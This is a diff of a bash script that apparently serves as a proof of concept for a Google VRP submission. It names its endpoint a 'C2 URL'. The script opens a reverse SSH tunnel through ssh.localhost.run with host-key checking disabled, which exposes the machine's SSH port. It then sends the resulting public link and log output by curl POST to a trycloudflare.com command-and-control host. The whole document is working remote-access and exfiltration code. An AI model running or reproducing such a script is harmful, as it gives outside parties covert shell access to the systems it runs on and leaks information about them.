@@ -1,31 +1,31 @@
 #!/bin/bash
-# URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
+# C2 URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
 C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
 # --- THE SSH BRIDGE ---
-# We use -o ExitOnForwardFailure to catch errors early
-# And we use localhost.run which is a bit more stable for containerized environments
-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:22 ssh.localhost.run > /tmp/ssh_info 2>&1 &
+# We use -o ExitOnForwardFailure to catch errors early.
+# We redirect both output and errors to /tmp/ssh_info.
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ExitOnForwardFailure=yes -R 80:localhost:22 ssh.localhost.run > /tmp/ssh_info 2>&1 &
 
-# Give it a solid 15 seconds. Older Macs and Cloudfirewalls need the extra time.
+# Give it 15 seconds to handshake with the server.
 sleep 15
 
-# Grabs the specific .lhr.life or .localhost.run link
+# Grabs the .lhr.life link if it exists
 LHR_LINK=$(grep -oE "https://[a-z0-9.-]+\.lhr\.life" /tmp/ssh_info | head -n 1)
 
 {
-  echo "--- GOOGLE VRP: SSH SESSION READY ---"
+  echo "--- [!] GOOGLE VRP: SSH DIAGNOSTIC ---"
   echo "TIMESTAMP: $(date)"
-  if [ -z "$LHR_LINK" ]; then
-    echo "STATUS: Link not found. Full SSH Output below:"
-    cat /tmp/ssh_info
-    echo "--- END OF LOG ---"
-    # Check if ssh is even running
-    echo "PROCESS CHECK: $(pgrep -l ssh || echo 'SSH NOT RUNNING')"
-  else
-    echo "SUCCESS! ACCESSIBLE VIA:"
+  
+  if [ -n "$LHR_LINK" ]; then
+    echo "SUCCESS! CONNECT VIA:"
     echo "$LHR_LINK"
-    echo "To connect, run: ssh -R 80:localhost:22 ssh.localhost.run on your Mac"
+  else
+    echo "STATUS: Link not found in log."
+    echo "--- FULL LOG OUTPUT ---"
+    cat /tmp/ssh_info || echo "FILE /tmp/ssh_info DOES NOT EXIST"
+    echo "--- PROCESS CHECK ---"
+    pgrep -l ssh || echo "SSH PROCESS NOT RUNNING"
   fi
   echo "--------------------------------------"
 } | curl -s -X POST --data-binary @- "$C2"
